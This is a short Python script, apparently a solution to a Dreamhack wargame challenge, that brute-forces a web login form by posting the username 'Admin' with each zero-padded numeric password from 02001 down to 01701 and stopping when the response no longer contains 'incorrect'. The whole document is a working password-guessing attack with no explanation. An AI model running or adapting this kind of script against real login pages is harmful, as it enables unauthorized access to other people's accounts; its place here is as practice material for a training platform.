import requests

url = "http://host3.dreamhack.games:19076/login"



for i in range(2001, 1700,-1):
    r = requests.post(url, data={"id": "Admin", "pw": f"{i:05d}"})
    print(f"{i:05d}")

    if "incorrect" not in r.text:
        print(i)
        break
    